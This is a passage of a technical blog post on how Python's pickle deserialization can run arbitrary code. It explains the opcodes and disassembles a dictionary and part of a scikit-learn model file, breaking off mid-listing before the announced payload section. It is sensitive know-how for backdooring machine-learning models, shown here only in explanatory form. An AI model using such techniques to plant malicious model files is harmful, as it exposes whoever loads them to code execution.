<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><title>The Dark Side of Python’s pickle – How to Backdoor an AI Model &#183; JC</title>
<meta name=title content="The Dark Side of Python’s pickle – How to Backdoor an AI Model &#183; JC"><meta name=keywords content="ml,python,"><link rel=canonical href=https://jchandra.com/posts/python-pickle/><link type=text/css rel=stylesheet href=/css/main.bundle.min.abe04668e5af705d9bde79f751a484642c9de8ebf59bbb3a85ab724d401f5c296cb2d347b87c3ca26151e1b85e703d19ff78c7a07a6537c5dbc0a7be784bed6f.css integrity="sha512-q+BGaOWvcF2b3nn3UaSEZCyd6Ov1m7s6hatyTUAfXClsstNHuHw8omFR4bhecD0Z/3jHoHplN8XbwKe+eEvtbw=="><script type=text/javascript src=/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj+e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.b6411b5d4cd56c0068d34c4acbce043846adad56b824e3d486a06d3459aed2eb7f7413874b7871cc2c822c8c8834cbed944022918bcc8cca710a962167c36d32.js integrity="sha512-tkEbXUzVbABo00xKy84EOEatrVa4JOPUhqBtNFmu0ut/dBOHS3hxzCyCLIyINMvtlEAikYvMjMpxCpYhZ8NtMg==" data-copy data-copied></script><script src=/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:url" content="https://jchandra.com/posts/python-pickle/"><meta property="og:site_name" content="JC"><meta property="og:title" content="The Dark Side of Python’s pickle – How to Backdoor an AI Model"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-03-13T00:34:08+05:30"><meta property="article:modified_time" content="2025-03-13T00:34:08+05:30"><meta property="article:tag" content="Ml"><meta property="article:tag" content="Python"><meta name=twitter:card content="summary"><meta name=twitter:title content="The Dark Side of Python’s pickle – How to Backdoor an AI Model"><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"","name":"The Dark Side of Python’s pickle – How to Backdoor an AI Model","headline":"The Dark Side of Python’s pickle – How to Backdoor an AI Model","inLanguage":"en","url":"https:\/\/jchandra.com\/posts\/python-pickle\/","author":{"@type":"Person","name":"JC"},"copyrightYear":"2025","dateCreated":"2025-03-13T00:34:08\u002b05:30","datePublished":"2025-03-13T00:34:08\u002b05:30","dateModified":"2025-03-13T00:34:08\u002b05:30","keywords":["ml","python"],"mainEntityOfPage":"true","wordCount":"1464"}]</script><meta name=author content="JC"><link href=https://www.linkedin.com/in/jayanthchandra/ rel=me><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script><meta name=theme-color></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a></div><div style=padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3"><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium text-gray-500 hover:text-gray-900">JC</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/posts/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>Blog</p></a><a href=https://github.com/jayanthchandra/ target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><span class=mr-1><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span><p class="text-base font-medium" title>GitHub</p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title>
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title>
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></button>
<button id=appearance-switcher-mobile aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div><div class="-my-2 md:hidden"><label id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentcolor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper style=padding-top:5px class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/posts/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>Blog</p></a></li><li class=mt-1><a href=https://github.com/jayanthchandra/ target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><div class=mr-2><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></div><p class="text-bg font-bg" title>GitHub</p></a></li></ul></div></label></div></div><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header id=single_header class="mt-5 max-w-prose"><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">The Dark Side of Python’s pickle – How to Backdoor an AI Model</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2025-03-13T00:34:08+05:30>13 March 2025</time><span class="px-2 text-primary-500">&#183;</span><span>1464 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">7 mins</span></div></div><div class="flex author"><img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width=96 height=96 alt=JC src=/img/user_hu_aa73e8455543a7f9.png><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">Author</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">JC</div><div class="text-sm text-neutral-700 dark:text-neutral-400">Staff Engineer</div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://www.linkedin.com/in/jayanthchandra/ target=_blank aria-label=Linkedin rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentcolor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg></span></span></a></div></div></div></div><div class=mb-5></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8"><div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10"><details open id=TOCView class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#intro>Intro</a></li><li><a href=#how-does-it-work->How does it work ?</a><ul><li><a href=#example>Example</a></li><li><a href=#example---regression-model>Example - Regression Model</a><ul><li><a href=#1-identifying-the-stored-object>1. Identifying the Stored Object</a></li><li><a href=#2-creating-the-object>2. Creating the Object</a></li><li><a href=#3-storing-model-parameters>3. Storing Model Parameters</a></li><li><a href=#4-storing-scikit-learn-version>4. Storing Scikit-Learn Version</a></li><li><a href=#5-finalizing-object-construction>5. Finalizing Object Construction</a></li></ul></li></ul></li><li><a href=#injecting-a-backdoor-into-an-ai-model>Injecting a Backdoor into an AI Model</a><ul><li><a href=#crafting-a-malicious-payload>Crafting a malicious payload</a><ul><li><a href=#how-an-attacker-could-exploit-this>How an Attacker Could Exploit This</a></li><li><a href=#disassembling-the-payload>Disassembling the payload</a></li></ul></li></ul></li><li><a href=#mitigation---strategy>Mitigation - Strategy</a><ul><li><ul><li><a href=#layer-1-attack-mitigation>Layer 1: Attack Mitigation</a></li><li><a href=#layer-2-model-security>Layer 2: Model Security</a></li><li><a href=#layer-3-infrastructure-security>Layer 3: Infrastructure Security</a></li></ul></li></ul></li></ul></nav></div></details><details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden"><summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#intro>Intro</a></li><li><a href=#how-does-it-work->How does it work ?</a><ul><li><a href=#example>Example</a></li><li><a href=#example---regression-model>Example - Regression Model</a><ul><li><a href=#1-identifying-the-stored-object>1. Identifying the Stored Object</a></li><li><a href=#2-creating-the-object>2. Creating the Object</a></li><li><a href=#3-storing-model-parameters>3. Storing Model Parameters</a></li><li><a href=#4-storing-scikit-learn-version>4. Storing Scikit-Learn Version</a></li><li><a href=#5-finalizing-object-construction>5. Finalizing Object Construction</a></li></ul></li></ul></li><li><a href=#injecting-a-backdoor-into-an-ai-model>Injecting a Backdoor into an AI Model</a><ul><li><a href=#crafting-a-malicious-payload>Crafting a malicious payload</a><ul><li><a href=#how-an-attacker-could-exploit-this>How an Attacker Could Exploit This</a></li><li><a href=#disassembling-the-payload>Disassembling the payload</a></li></ul></li></ul></li><li><a href=#mitigation---strategy>Mitigation - Strategy</a><ul><li><ul><li><a href=#layer-1-attack-mitigation>Layer 1: Attack Mitigation</a></li><li><a href=#layer-2-model-security>Layer 2: Model Security</a></li><li><a href=#layer-3-infrastructure-security>Layer 3: Infrastructure Security</a></li></ul></li></ul></li></ul></nav></div></details><script>var margin=200,marginError=50;(function(){var t=$(window),e=$("#TOCView"),s=e.height();function n(){var n=t.height()-margin;s>=n?(e.css("overflow-y","scroll"),e.css("max-height",n+marginError+"px")):(e.css("overflow-y","hidden"),e.css("max-height","9999999px"))}t.on("resize",n),$(document).ready(n)})(),function(){var t,e=$("#TableOfContents");if(e.length>0){t=$(window);function n(){var s,o=t.scrollTop(),i=$(".anchor"),n="";if(i.each(function(e,t){t=$(t),t.offset().top-$(window).height()/3<=o&&(n=decodeURIComponent(t.attr("id")))}),s=e.find("a.active"),s.length==1&&s.eq(0).attr("href")=="#"+n)return!0;s.each(function(e,t){$(t).removeClass("active")}),e.find('a[href="#'+n+'"]').addClass("active"),e.find('a[href="#'+n+'"]').parentsUntil("#TableOfContents").each(function(e,t){$(t).children("a").parents("ul").show()})}t.on("scroll",n),$(document).ready(function(){n()})}}()</script></div></div><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><h2 class="relative group">Intro<div id=intro class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#intro aria-label=Anchor>#</a></span></h2><p>Python’s <code>pickle</code> module is a popular way to save and load objects. It’s used in machine learning, data science, and web applications to store models, cache data, and transfer objects between processes.
However, pickle has a major security flaw —it can execute arbitrary code when loading data. This makes it risky, especially when handling untrusted files.</p><p>In this post, we are going to dive deep into how pickle works, all the way down to the assembly language level. We&rsquo;ll explore how Python objects are turned into pickle data, how that data is executed by the Python interpreter, and how malicious pickle files can be used to exploit vulnerabilities.</p><h2 class="relative group">How does it work ?<div id=how-does-it-work- class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#how-does-it-work- aria-label=Anchor>#</a></span></h2><p>The Python <code>pickle</code> module implements a serialization (pickling) and deserialization (unpickling) protocol that translates arbitrary Python objects into a byte stream, and vice versa. The pickle module operates a separate stack-based virtual machine, distinct from CPython’s VM, processing a sequence of opcodes to reconstruct objects. Essentially, pickle functions like a mini interpreter, executing its own opcodes from a binary stream, similar to how Python’s main interpreter loop runs bytecode. However, unlike Python bytecode, which has safety checks, pickle opcodes can invoke arbitrary functions, making it inherently unsafe.</p><p>These Pickle opcodes can be categorized into several groups:</p><ul><li>Stack Manipulation: Control the VM&rsquo;s stack, managing the flow of data during serialization and deserialization.</li><li>Data Loading: Responsible for pushing literal values and container objects onto the stack.</li><li>Object Construction: Used to instantiate Python objects, invoking their constructors and setting their attributes.</li><li>Function Invocation: Enable the invocation of arbitrary functions and the loading of global variables, which are critical for supporting complex object serialization.</li><li>Memoization: Handles object references and memoization, allowing the protocol to efficiently serialize and deserialize cyclic object graphs.</li></ul><p>The complete set of pickle opcodes is defined and implemented within the CPython source code file <a href=https://github.com/python/cpython/blob/3ddf983afda7173277666bb5f9033634e59363f8/Lib/pickletools.py#L1153 target=_blank><code>Lib/pickletools.py</code></a> and opcode handling by <a href=https://github.com/python/cpython/blob/f3e275f1a92c0f668b1397b21e8ffaaed576c317/Modules/_pickle.c#L7924 target=_blank><code>Modules/_pickle.c</code></a></p><p>Pickle uses <code>__reduce__</code> or <code>__reduce_ex__</code> to customize serialization for objects, employing opcodes like GLOBAL and REDUCE.
To manage object references and handle cycles, it utilizes a memo and PUT/GET opcodes, ensuring efficient reconstruction.</p><h3 class="relative group">Example<div id=example class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#example aria-label=Anchor>#</a></span></h3><p><figure><img class="my-0 rounded-md" loading=lazy src=/images/b2_simple_pickle.png alt="Simple Code"></figure>This pickle sequence represents a simple dictionary with one key-value pair. Let’s break it down by opcode groups:</p><ol><li>Protocol and Framing<ul><li><code>PROTO 4 (\x80 4)</code>: Specifies that this pickle uses protocol version 4.</li><li><code>FRAME 34 (\x95 34)</code>: Indicates that 34 bytes are allocated for this pickle data.</li></ul></li><li>Stack Manipulation & Data Loading<ul><li><code>EMPTY_DICT (})</code>: Pushes an empty dictionary {} onto the stack.</li><li><code>MEMOIZE (\x94)</code>: Stores this dictionary in memory at index 0.</li><li><code>SHORT_BINUNICODE 'title' (\x8c 'title')</code>: Loads the string &ldquo;title&rdquo; onto the stack and stores it in memory at index 1.</li><li><code>SHORT_BINUNICODE 'Welcome to my blog!' (\x8c 'Welcome to my blog!')</code>: Loads the string &ldquo;Welcome to my blog!&rdquo; onto the stack and stores it in memory at index 2.</li></ul></li><li>Object Construction<ul><li><code>SETITEM (s)</code>: Pops the key and value from the stack and inserts them into the dictionary.</li></ul></li><li>Termination<ul><li><code>STOP (.)</code>: Ends deserialization.</li></ul></li></ol><h3 class="relative group">Example - Regression Model<div id=example---regression-model class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#example---regression-model aria-label=Anchor>#</a></span></h3><p>Lets analyse a simple linear regression model</p><p><figure><img class="my-0 rounded-md" loading=lazy src=/images/b2_model.png alt="Linear Model"></figure></p><h4 class="relative group">1. Identifying the Stored Object<div id=1-identifying-the-stored-object class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#1-identifying-the-stored-object aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>11</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;sklearn.linear_model._base&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>39</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 0)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>40</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;LinearRegression&#39;</span><span class=w>
